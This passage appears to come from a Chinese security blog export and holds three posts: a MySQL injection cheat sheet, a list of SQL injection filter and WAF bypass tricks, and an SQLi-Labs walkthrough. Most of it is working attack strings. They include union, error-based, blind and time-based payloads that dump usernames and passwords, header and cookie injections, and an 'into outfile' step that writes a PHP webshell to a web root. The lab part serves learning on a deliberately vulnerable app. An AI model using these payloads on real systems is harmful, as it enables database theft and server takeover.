猜字段数 order by n# 查看mysql基本信息 and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7# 查询数据库 and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1# and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata# 查询表名 and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1# and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码# 查询字段 and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1# and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码# 查询数据 and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表# 判断是否具有读写权限 and (select count(*) from mysql.user)&gt;0# 读权限 and (select count(file_priv) from mysql.user)&gt;0# 写权限 6.mysql读取写入文件 必备条件： 读：file权限必备 写：1.绝对路径 2.union使用 3. 可以使用&apos;&apos; ————————-读———————- mysql3.x读取方法 create table a(命令 文本名); load data infile &apos;c:\\xxx\\xxx\\xxx.txt&apos; into table a; select * from a; mysql4.x读取方法 除上述方法还可以使用load_file() create table a(命令 文本名); insert into a(命令) values(load_file(&apos;c:\\ddd\\ddd\\ddd.txt&apos;)); select * from a; mysql5.x读取方法 上述两种都可以 读取文件技巧： load_file(char(32,26,56,66)) load_file(0x633A5C626F6F742E696E69) c:\boot.ini ————————-写———————- into outfile写文件 union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;# union select 1,2,3,load_file(&apos;d:\web\logo123.jpg&apos;),5,6,7,8,9,10,7 into outfile &apos;d:\web\90team.php&apos;# 0x01 mysql一般注入(insert、update)一般情况同上 mysql一般请求mysql_query不支持多语句执行，mysqli可以。 insert注入多使用报错注入! 1.如果可以直接插入管理员可以直接使用! insert into user(username,password) values(&apos;xxxx&apos;,&apos; xxxx&apos;),(&apos;dddd&apos;,&apos;dddd&apos;)/* &apos;); 2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell update注入同上 0x02 mysql报错注入1、通过floor暴错FLOOR(x)函数用于返回小于或等于x的最大整数值。 通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor (random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一 行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。 group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行，不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。 具体原理参考：http://www.mysqlops.com/2012/05/15/mysql-sql-analyze.html）。 常用语句： 数据库版本 ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 简单办法爆库 ?id=info() 爆用户 ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆数据库名 ?id=1+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆库 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆表 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆字段 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 爆内容 ?id=1+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 注：使用group by报错注入方式的注意事项 (1)报错语句中的count(*)不可缺少。 (2)from 表也不可缺少。 2、ExtractValue(有长度限制,最长32位)ExtractValue()函数是对XML文档进行查询和修改的函数。 extractvalue()函数有两个参数，在实际注入时第一个参数设为1，第二个参数就是需要爆的数据。 如：extractvalue(1, concat(0x5c,version()))。 同样，在使用中会遇到如下面UpdateXml()类似的相同问题，即如果在爆的数据前不连接其他字符可能会显示不完全。即获取版本号时，第二个参数不能为version(),而应改为concat(0x5c,version()) 常用语句： ?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e)) ?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) 3、UpdateXml(有长度限制,最长32位)UpdateXml()函数也是是对XML文档进行查询和修改的函数。 UpdateXml()函数有三个参数，在实际渗透时第一个和第三个参数直接写1即可，第二个参数就是需要爆出的内容，要爆出不同的内容直接修改第二个参数即可。但是在实际使用时注意一个问题：即爆错的内容可能显示不完整。 常用语句： ?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) ?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) 4、NAME_CONST(适用于低版本)?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)-- 不好用 5、Error based Double Query Injection数据库版本 ?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 0x03 mysql一般盲注使用ascii AND ascii(substring((SELECT password FROM users where id=1),1,1))=49 使用正则表达式 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &apos;^[a-n]&apos; LIMIT 0,1) 盲注没什么说的，就是利用是否等于，这些函数判断ascii码，脚本跑呗，或者sqlmap 0x04 mysql时间盲注时间盲注用两个函数一个是sleep,一个是benchmark，sleep就不说了。 benchmark语法： BENCHMARK(count,expr) BENCHMARK()函数重复countTimes次执行表达式expr 常用语句： union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(&apos;msg&apos;,&apos;by 5 seconds&apos;)),null) from (select database() as current) as tbl UNION SELECT IF(SUBSTRING(Password,1,1)=&apos;a&apos;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = &apos;root&apos; 0x05 mysql的一些特性在SQL注入中的利用1、大小写利用不管你表单填写的是什么，插入到mysql数据库的时候，都会变成小写。 如：注册admin时显示用户已存在，你可以尝试ADMIN注册。 2、字符截断利用mysql在使用utf8的时候，一个字符的大小的上限为3字节，而当出现四个字节的字符时，是需要用使用utf8mb4编码，不使用的话，会将不识别的四字节的字符连同后面的字符串一同舍弃。 所以只要我们使用ascii&gt;=256的特殊字符就可以绕过了。 如： UPDATE `wp_comments` SET `comment_content` = &apos;admin特殊字符123456 &apos; WHERE `wp_comments`.`comment_ID` =12; 以上语句插入到数据库的内容就是admin了，后面的123456被特殊字符截断。 3、超过长度截断利用就是利用数据定义时，定义的长度大小截断。 如： insert into user values (&apos;admin++++++++++++++++123456&apos;,&apos;123456&apos;); 以上语句，如果长度限制是16位，那么插入到数据库中的时候用户名的123456被截断 用户：admin 密码：123456]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>MySQL</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入绕过技巧]]></title>
    <url>%2F2016%2F08%2F01%2FSQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[SQL注入攻击是黑客对数据库进行攻击的常用手段之一。由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。 0x00 sql注入的原因sql注入的原因，表面上说是因为 拼接字符串，构成sql语句，没有使用 sql语句预编译，绑定变量。 但是更深层次的原因是，将用户输入的字符串，当成了 “sql语句” 来执行。 比如上面的 String sql = “select id,no from user where id=” + id;我们希望用户输入的 id 的值，仅仅作为一个字符串字面值，传入数据库执行，但是当输入了： 2 or 1=1 时，其中的 or 1=1 并没有作为 where id= 的字面值，而是作为了 sql语句 来执行的。所以其本质是将用户的输入的数据，作为了命令来执行。 0x01 sql注入绕过1.1 注释符绕过常用注释符： //, -- , /**/, #, --+, -- -, ;,%00,--a UNION /**/ Select /**/user，pwd，from user U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user 1.2 大小写绕过?id=1+UnIoN/**/SeLeCT 1.3 内联注释绕过id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- - 通常情况下，上面的代码可以绕过过滤器，请注意，我们用的是 Like而不是 = 1.4 双关键字绕过?id=1+UNIunionON+SeLselectECT+1,2,3– 1.5 编码绕过如URLEncode编码，ASCII,HEX,unicode编码绕过 or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 十六进制编码 SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 双重编码绕过 ?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+ 一些unicode编码举例： 单引号：&apos; %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7 空白： %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0 左括号(: %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8 右括号): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9 1.6 空格绕过两个空格代替一个空格，用Tab代替空格 %20 %09 %0a %0b %0c %0d %a0 /**/ 括号绕过空格 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来 select(user())from dual where 1=1 and 2=2; 1.7 万能密钥绕过用经典的or 1=1判断绕过,如or ‘swords’ =’swords 1.8 +,-,.号拆解字符串绕过?id=1&apos; or &apos;11+11&apos;=&apos;11+11&apos; &quot;-&quot;和&quot;.&quot; 1.9 like绕过?id=1&apos; or 1 like 1 绕过对“=”，“&gt;”等的过滤 2.0 in绕过or &apos;1&apos; IN (&apos;swords&apos;) 2.1 &gt;,&lt;绕过or &apos;password&apos; &gt; &apos;pass&apos; or 1&lt;3 2.2 等价函数与命令绕过1.函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者： substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 2.符号 and和or有可能不能使用，可以试下&amp;&amp;和|| =不能使用的情况，可以考虑尝试&lt;、&gt; 3.生僻函数 MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1)) and extractvalue(1, concat(0x5c, (select user()),0x5c)) 2.3 反引号`绕过select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用 2.4 换行符绕过%0a、%0d 2.5 截断绕过%00,%0A,?,/0,////////////////........////////,%80-%99 目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。 ././././././././././././././././abc ////////////////////////abc ..1/abc/../1/abc/../1/abc 2.6 宽字节绕过过滤单引号时，可以试试宽字节 %bf%27 %df%27 %aa%27 2.7 \N绕过\N其实相当于NULL字符 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0 2.8 特殊的绕过函数1. 通过greatest函数绕过不能使用大小于符号的情况 greatest(a,b)，返回a和b中较大的那个数。 当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用： mysql&gt; select greatest(ascii(mid(user(),1,1)),150)=150; +------------------------------------------+ | greatest(ascii(mid(user(),1,1)),150)=150 | +------------------------------------------+ | 1 | +------------------------------------------+ 如果小于150，则上述返回值为True。 2. 通过substr函数绕过不能使用逗号的情况 mid(user() from 1 for 1) 或 substr(user() from 1 for 1) mysql&gt; select ascii(substr(user() from 1 for 1)) &lt; 150; +------------------------------------------+ | ascii(substr(user() from 1 for 1)) &lt; 150 | +------------------------------------------+ | 1 | +------------------------------------------+ 3.使用数学运算函数在子查询中报错 exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。 ~x 是一个一元运算符，将x按位取补 select exp(~(select*from(select user())a)) mysql报错： mysql&gt; select exp(~(select*from(select user())a)); ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’ 这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是： (select*from(select user())a) 得到字符串 root@localhost 表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数 附：PHP中一些常见的过滤方法及绕过方式过滤关键字 and or php代码 preg_match(&apos;/(and|or)/i&apos;,$id) 会过滤的攻击代码 1 or 1=1 1 and 1=1 绕过方式 1 || 1=1 1 &amp;&amp; 1=1 过滤关键字 and or union php代码 preg_match(&apos;/(and|or|union)/i&apos;,$id) 会过滤的攻击代码 union select user,password from users 绕过方式 1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos; 过滤关键字 and or union where php代码 preg_match(&apos;/(and|or|union|where)/i&apos;,$id) 会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; 过滤关键字 and or union where php代码 preg_match(&apos;/(and|or|union|where)/i&apos;,$id) 会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; 过滤关键字 and, or, union, where, limit php代码 preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_id聚合中user_id为1的user为admin 过滤关键字 and, or, union, where, limit, group by php代码 preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos; 绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1 过滤关键字 and, or, union, where, limit, group by, select php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1 绕过方式 1 &amp;&amp; substr(user,1,1) = &apos;a&apos; 过滤关键字 and, or, union, where, limit, group by, select, &apos; php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1 绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61) 过滤关键字 and, or, union, where, limit, group by, select, &apos;, hex php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = unhex(61) 绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。 过滤关键字 and, or, union, where, limit, group by, select, &apos;, hex, substr php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt; 绕过方式 1 &amp;&amp; lpad(user,7,1) 过滤关键字 and, or, union, where, limit, group by, select, &apos;, hex, substr, 空格 php代码 preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id) 会过滤的攻击代码 1 &amp;&amp; lpad(user,7,1)/td&gt; 绕过方式 1%0b||%0blpad(user,7,1) 过滤关键字 and or union where php代码 preg_match(&apos;/(and|or|union|where)/i&apos;,$id) 会过滤的攻击代码 1 || (select user from users where user_id = 1) = &apos;admin&apos; 绕过方式 1 || (select user from users limit 1) = &apos;admin&apos;]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLi-Labs学习笔记]]></title>
    <url>%2F2016%2F07%2F29%2FSQL-Labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能让我们有能力通过结构化查询来管理大型数据库。 我们将要使用的实验室是SQLi Labs，它是一个可以从https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。 Less-1关键代码： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 可以看到对于直接 GET 进来的文本没有过滤。同时，在查询语句中，id=’$id’，变量加了引号。这里引号的意思是把输入的 id 当做字符串来处理，取从头开始的最长数字且类型转换为整形进行查询。 ?id=12a 显示id为12的用户 ?id=1a2a 显示id为1的用户 ?id=102a 显示id为102的用户（不存在） 盲注 ?id=1%27and+left(version(),1)=5%23 得出数据库版本为5开头 ?id=1%27and+length(database())=8%23 数据库名长度为8 ?id=1%27and+left(database(),8)=&apos;security&apos;%23 数据库为security ?id=1%27and+length(username)=4%23 用户名长度为4 ?id=1%27and+left(username,4)=&apos;Dumb&apos;%23 用户名为Dumb ?id=1%27and+length(password)=4%23 密码长度为4 ?id=1%27and+left(password,4)=&apos;Dumb&apos;%23 密码为Dumb Less-2关键代码： $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”; 同样未做过滤，但此处的变量 id 无引号。大概是直接将变量 id 当做整形传入查询。 ?id=12 显示 id 为 12 的用户 ?id=12a 报错：Unknown column &apos;12a&apos; in &apos;where clause&apos; ?id=%31 显示 id 为 1 的用户 注入测试： ?id=1+and+left(version(),1)=5 直接注入即可得到版本号 Less-3关键代码： $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”; 未过滤，但变量 id 加了引号和括号。将变量 id 以字符串形式引入，和Less-1很像，但是却又多了个括号，猜测是防止注入语句。 注入测试： ?id=12+and+1=1 显示正确 ?id=12+an 不完全语句也显示正确 猜测：括号将变量限制在括号范围内，尝试手动提前匹配括号注入。 ?id=12%27 成功报错：&apos;&apos;12&apos;&apos;) LIMIT 0,1&apos; at line 1 ?id=1%27%29and+1=2%23 无显示，可注入 上面那条语句还原到 SQL 语句时，为： SELECT * FORM users WHERE id=(&apos;1&apos;)and 1=2#&apos;) LIMIT 0,1 将括号提前结束且用 #号注释掉接下来的语句。接下来的注入只要替换 and 1=1 语句就行了。 Less-4关键代码： $id = ‘“‘ . $id . ‘“‘; $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”; 对变量 id 做了处理。该处理在 id 前后添加双引号。 ?id=1%22%29+and+1=2%23 无显示，可注入 SELECT * FROM users WHERE id=(&quot;1&quot;)and 1=2#&quot;) LIMIT 0,1 Less-5关键代码： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; ?id=1&apos;and+1=2# Less-6关键代码： $id = ‘“‘.$id.’”‘; $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”; ?id=1&quot;and+1=2# Less-7关键代码： $sql=”SELECT * FROM users WHERE id=((‘$id’)) LIMIT 0,1”; ?id=1&apos;))and 1=2# Less-8关键代码： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; ?id=1&apos; and 1=2# Less-9尝试了很多次，各种组合，但是服务器返回的结果都是一样。尝试 ?id=10000000000返回结果也是正确，因为不存在这么大的 id，所以判断这个页面把正确和错误的信息全部返回一致。于是，使用基于时间的注入，构造以下语句： ?id=1&apos; and sleep(5) %23 如果错误，则服务器处理5秒再返回，否则直接返回，找到正确的注入点。 ?id=1&apos; and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5)) %23 ?id=1&apos; and if(ascii(substr(database(),1,1))&gt;114, 0, sleep(5)) %23 第一个语句暂停五秒第二个直接返回，判断数据库名的第一个字母为s（ascii为115） Less-10又是一个基于时间的注入，尝试了下，注入点在这： ?id=1&quot; and sleep(5) %23 Less-11这个页面采用 POST 的方法得到数据。于是用 HackBar 修改 post 数据进行测试： uname=admin&amp;passwd=123&apos; 显示： &apos;&apos;123&apos;&apos; LIMIT 0,1&apos; 去掉单引号 &apos;123&apos;&apos; LIMIT 0,1 再去掉密码的单引号 123&apos; LIMIT 0,1 所以确定是单引号注入，直接万能密钥试试： uname=admin&apos; or &apos;1&apos;=&apos;1 &amp;passwd=123456 这里的话有个点： 如果输入：uname=admin’ or ‘1’=’1 &amp;passwd=123456，会显示失败，为什么呢？ 首先and的优先级高于or 【就是and先运算】 那么’1’=’1’ and password=’123456’先运算，因为users表里面的password字段没有一个数据时test，右边是false，那么整个表达式就是false 这个时候整个的语句就是： SELECT username, password FROM users WHERE username=&apos;test&apos; or false LIMIT 0,1 数据库里没有test用户，所以就失败了。 而万能密钥的语句是： SELECT username, password FROM users WHERE username=&apos;admin&apos; or false LIMIT 0,1 对于上述的情况，我们在密码字段加入即可 uname=test&amp;passwd=123456&apos; or &apos;1&apos;=&apos;1 SELECT username, password FROM users WHERE username=&apos;test&apos; or true LIMIT 0,1 Less-12先尝试单引号，双引号。 输入： uname=test&amp;passwd=123456” 报错： ‘“123456””) LIMIT 0,1’ 123456”) LIMIT 0,1 构造POC： uname=test&amp;passwd=123456”) or “1”=”1”# Less-13先尝试单引号，双引号。 输入： uname=test&amp;passwd=123456’ 报错： ‘’123456’’) LIMIT 0,1’ 123456’) LIMIT 0,1 构造POC： uname=test&amp;passwd=123456’) or (‘1’)=(‘1 或者 uname=test&amp;passwd=123456’) or “1”=”1”# Less-14先尝试单引号，双引号。 输入： uname=test&amp;passwd=123456” 报错： ‘“123456”” LIMIT 0,1’ 123456” LIMIT 0,1 构造POC： uname=test&amp;passwd=123456” or “1”=”1”# 或者 uname=test&amp;passwd=123456” or “1”=”1 Less-15这里输入单引号，双引号就不会报错了，我们只能加上永真永假或者时间延迟函数了。 测试发现时间延迟不行。 uname=test&amp;passwd=123456’ or 1=1# 直接成功了， 试一下盲注也是可以得。 uname=test&amp;passwd=123456’ or length(database())=8# Less-16 uname=test&amp;passwd=123456”) or 1=1# 成功登陆，时间延迟注入试试 uname=test&amp;passwd=123456&quot;) or if(length(database())=7,1,sleep(5)) # 暂停，说明不对 uname=test&amp;passwd=123456&quot;) or if(length(database())=8,1,sleep(5)) # 成功登陆 Less-17uname=admin&amp;passwd=123456&apos; where username=&apos;admin&apos; and 1=2 # 对应的SQL语句是： UPDATE users SET password = &apos;123456&apos; where username=&apos;admin&apos; and 1=2 #&apos; WHERE username=&apos;admin&apos; Less-18这是 Header 注入。 意思是，从服务器要求的 Header 头里面找到可以注入的注入点。 从源代码可以看出，服务器将 Header 里面的 user-agent 的值没有经过过滤就带入了 insert into 语句，这就造成了注入。 $uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;]; ... $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;; 首先，抓包。 还有一个问题就是，insert into 语句要在登陆成功后才能执行，所以必须输入正确的用户和密码再抓包。 xpath注入： payload：updatexml(1,concat(0x7e,(version())),0) 第一个参数是 目标xml 第二个参数是 xpath的表达式，这个看w3c那个xpath教程 第三个参数是 要将xpath的表达式的东西将目标xml替换成什么 POC: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;,&quot;)# 响应： Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)# XPATH syntax error: &apos;:5.5.47&apos; User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;)# 响应： Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or updatexml(0,concat(0x3a,(select username from users limit 0,1)),0),&quot;1&quot;) XPATH syntax error: &apos;:Dumb&apos; Less-19POC: Referer: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;)# 响应： Your Referer is: 1&apos; or updatexml(0,concat(0x3a,version()),0),&quot;1&quot;) XPATH syntax error: &apos;:5.5.47&apos; 这里也可以用一个报错函数extractvalue 第一个参数也是个xml，第二个参数就是xpath的表达式，这个函数是获取xml中某个节点的值 与updatexml一次只能更新一个节点不同，extractvalue可以一次获取多个节点的值，并以空格分隔 POC: Referer: 1&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)# 响应： Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0&apos; or extractvalue(0,concat(0x3a,version())),&apos;1&apos;)# XPATH syntax error: &apos;:5.5.47&apos; Less-20这题用 Cookies 注入 POC: Cookie: uname=admin&apos;; 报错 Cookie: uname=admin&apos; order by 3#; 正常显示 Cookie: uname=admin&apos; order by 4#; 报错，所以是三个字段 Cookie: uname=admin&apos; and 1=2 union select 1,2,3#; 显示2，3 Cookie: uname=admin&apos; and 1=2 union select 1,database(),version()#; 数据库：security,版本：5.5.47 Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(table_name） from information_schema.tables where table_schema=database()#; 表名：emails,referers,uagents,users，这里也可以用limit语句 Cookie: uname=admin&apos; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#; 字段：user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password Cookie: uname=admin&apos; and 1=2 union select 1,username,password from users limit 0,1#; 内容：Your Login name:Dumb Your Password:Dumb Less-21cookies 注入 但是，这一次的 cookies 是加密的. setcookie(&apos;uname&apos;, base64_encode($row1[&apos;username&apos;]), time()+3600); ... $cookee = base64_decode($cookee); POC: &apos;) union select 1,2,username from users# JykgdW5pb24gc2VsZWN0IDEsMix1c2VybmFtZSBmcm9tIHVzZXJzIw== 显示密码Dumb Less-22单引号换成双引号就行了 uname=IiB1bmlvbiBzZWxlY3QgMSwyLHVzZXJuYW1lIGZyb20gdXNlcnMj Your Login name:2 Your Password:Dum Less-23这一题它在输入的时候过滤了几个字符 $reg = &quot;/#/&quot;; $reg1 = &quot;/--/&quot;; $replace = &quot;&quot;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id); 所以，我们不能用 #来注释掉剩下的查询语句。 那么该怎么办呢？ 一个办法就是，让剩下的语句变得完整就行。 查询语句的代码为： $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 构造语句： ?id=1’and+’1’=’1 Less-24二次注入 与数据库交互的有三个页面：login_create.php，login.php，pass_change.php login_create.php,登陆页面对用户和密码都进行了处理。 $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]); $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]); $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;; login_create.php对新建用户进行处理 $username= mysql_escape_string($_POST[&apos;username&apos;]) ; $pass= mysql_escape_string($_POST[&apos;password&apos;]); $re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]); pass_change.php是修改密码的 关键代码： $username= $_SESSION[&quot;username&quot;]; $curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]); $pass= 